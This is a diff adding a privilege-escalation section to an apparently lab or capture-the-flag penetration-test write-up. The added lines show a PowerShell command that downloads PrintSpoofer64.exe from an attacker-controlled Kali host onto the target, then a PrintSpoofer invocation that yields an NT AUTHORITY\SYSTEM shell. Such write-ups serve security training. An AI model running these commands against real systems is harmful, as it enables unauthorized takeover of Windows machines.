@@ -187,6 +187,18 @@ Enumerated top 200 UDP ports:
 ## Local Enumeration
 #### - Navigated to "C:\Windows\system32" and typed "whoami.exe /priv" and found SeImpersonatePrivilege was enabled:
 ![](Pasted%20image%2020221015184540.png)
+#SeImpersonatePrivilege 
+
+#### - Typed "systeminfo.exe" and found the target machine was running on a x64 bit architecture:
+![](Pasted%20image%2020221015185752.png)
+
+#### - Downloaded a precompiled printspoofer64.exe onto my kali machine
+
+#### -Hosted the printspoofer64.exe file on my kali machine and transferred the file to the target machine by typing "(new-object System.Net.WebClient).DownloadFile('http://[Kali IP]/PrintSpoofer64.exe','c:\Users\tony\PrintSpoofer64.exe') (new-object System.Net.WebClient).DownloadFile('http://192.168.49.114/PrintSpoofer64.exe','c:\Users\tony\PrintSpoofer64.exe')" while in powershell:
+
+![](Pasted%20image%2020221015185846.png)
+
+#### -Typed "./PrintSpoofer64.exe -i -c cmd" and received a shell running as nt authority\system:
 
 
 
